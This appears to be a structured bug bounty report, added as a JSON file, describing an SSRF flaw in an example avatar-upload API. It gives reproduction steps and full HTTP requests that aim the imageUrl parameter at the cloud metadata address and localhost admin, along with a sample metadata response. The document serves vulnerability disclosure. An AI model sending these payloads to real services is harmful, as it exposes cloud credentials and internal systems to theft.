@@ -1,0 +1,31 @@
+{
+  "program": "Example Corp",
+  "title": "SSRF via imageUrl parameter on /api/upload-avatar",
+  "severity": "high",
+  "asset": "Example web application – avatar upload API /api/upload-avatar (imageUrl parameter)",
+  "entrypoint": "POST /api/upload-avatar",
+  "entrypoint_host": "app.example.com",
+  "ssrf_parameter": "imageUrl",
+  "attacker_control_level": "Full control over imageUrl value in JSON request body.",
+  "internal_targets": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://localhost/admin"
+  ],
+  "summary": "The imageUrl parameter in /api/upload-avatar allows SSRF, enabling requests to internal HTTP services such as EC2 metadata and localhost admin endpoints.",
+  "impact": [
+    "Ability to query EC2 metadata service and potentially retrieve credentials.",
+    "Ability to reach internal admin endpoints not exposed to the internet."
+  ],
+  "steps": [
+    "Send a POST request to /api/upload-avatar with imageUrl pointing to a benign external URL (e.g., https://example.org/logo.png) and confirm normal behaviour.",
+    "Change imageUrl to http://169.254.169.254/latest/meta-data/ and repeat the request.",
+    "Observe that the application fetches data from the cloud metadata service or shows a different error pattern / timing, confirming SSRF.",
+    "Optionally, test other internal targets such as http://localhost/admin and capture any sensitive data that is returned."
+  ],
+  "requests": {
+    "benign_request": "POST /api/upload-avatar HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nCookie: session=REDACTED;\n\n{\n  \"imageUrl\": \"https://example.org/logo.png\"\n}",
+    "benign_response": "HTTP/1.1 200 OK\nContent-Type: application/json; charset=utf-8\n...\n{\n  \"status\": \"ok\",\n  \"message\": \"Avatar uploaded successfully\"\n}",
+    "ssrf_request": "POST /api/upload-avatar HTTP/1.1\nHost: app.example.com\nContent-Type: application/json\nCookie: session=REDACTED;\n\n{\n  \"imageUrl\": \"http://169.254.169.254/latest/meta-data/\"\n}",
+    "ssrf_response": "HTTP/1.1 200 OK\nContent-Type: text/plain; charset=utf-8\n...\nami\ninstance-id\nsecurity-groups\n..."
+  }
+}
